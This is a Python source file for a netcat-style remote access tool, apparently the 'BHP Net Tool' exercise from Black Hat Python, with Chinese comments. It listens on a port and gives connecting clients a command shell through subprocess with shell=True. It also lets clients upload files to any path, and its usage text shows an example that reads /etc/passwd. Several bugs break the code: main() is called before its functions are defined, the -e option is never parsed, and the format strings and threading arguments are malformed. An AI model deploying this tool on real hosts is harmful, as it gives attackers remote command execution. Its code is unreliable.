import os
import socket
import getopt
import threading
import subprocess
import sys


listen				= False
command				= False
upload				= False
execute				= ""
target 				= ""
upload_destination 	= ""
port				= 0


def usage():
	print("BHP Net Tool")
	print()
	print("Usage: python_netcat.py  -t target_host -p port")
	print("-l --listen              -listen on [host]:[port] for incoming connections")
	print("-e --execute=file_to_run -execute the given file upon receiving a connection")
	print("-c --command             -initialize a command shell")
	print("-u --upload=destination  -upon receiving connection upload a file and write to [destination]")
	print()
	print()
	print("Examples: ")
	print("python_netcat.py -t 192.168.0.1 -p 5555 -l -c")
	print("python_netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
	print("python_netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
	print("echo 'ABCDEFGHI' | ./python_netcat.py -t 192.168.0.1 -p 135")
	sys.exit(0)


def main():
	global listen
	global port
	global execute
	global command
	global upload_destination
	global target


	if not len(sys.argv[1:]):
		usage()


	try:
		opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu", ["help", \
			"listen", "execute", "target", "port", "command", "upload"])
	except getopt.GetoptError as e:
		print(str(e))
		usage()


	for o, a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen = True
		elif o in ("-c", "--commandshell"):
			command =True
		elif o in ("-u", "--upload"):
			upload_destination = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert False, "Unhandled Option"


	# 进行监听还是仅从标准输入发送数据
	if not listen and len(target) and port > 0:
		# 从命令行读取内存数据
		# 这里将阻塞, 所以不再向标准输入发送数据时发送 CTRL+D
		buffer = sys.stdin.read()
		# 发送数据
		client_sender(buffer)


	# 我们开始监听并准备上传文件, 执行命令
	# 放置一个反弹shell
	# 取决于上面的命令行选项
	if listen:
		server_loop()


main()


def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


	try:
		# 连接到目标主机
		client.connect((target, port))

		if len(buffer):
			client.send(buffer)

		while True:
			# 现在等待数据回传
			recv_len = 1
			response = ""

			while recv_len:
				data = client.recv(4096)
				response += data

				if recv_len < 4096:
					break

			print(response)


			# 等待更多的输入
			buffer = raw_input("")
			buffer += "\n"

			# 发送数据
			client.send(buffer)

	except:
		print("[*] Exception! Exiting.")

		# 关闭连接
		client.close()


def server_loop():
	global target

	# 如果没有定义目标, 那么我们监听所有接口
	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))
	server.listen(5)

	while True:
		client_socket, addr = server.accept()

		# 分拆一个线程处理新的客户端
		client_thread = threading.Thread(target=client_handler, args=(client_socket))
		client_thread.start()


def run_command(command):
	# 换行
	command = command.rstrip()

	# 运行命令并将输出返回
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, 
			shell=True)
	except:
		output = "Failed to execute command. \r\n"

	# 将输出发送
	return output


def client_handler(client_socket):
	global upload
	global execute
	global command

	# 检测上传文件
	if len(upload_destination):
		# 读取所有的字符并写下目标
		file_buffer = ""

		# 持续读取数据知道没有符合的数据
		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data

		# 现在我们接受这些数据并将它们写出来
		try:
			file_descriptor = open(upload_destination, "wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			# 确认文件已经写出来
			client_socket.send("Successfully saved file to \
				%s\r\n % upload_destination")
		except:
			client_socket.send("Failed to save file to %s\r\n % \
				upload_destination")

	if command:
		while True:
			# 跳出一个窗口
			client_socket.send("<BHP:#> ")

			# 现在我们接收文件直到换行符(enter key)
			cmd_buffer = ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

				# 返还命令输出
				response = run_command(cmd_buffer)

				# 返回响应数据
				client_socket.send(response)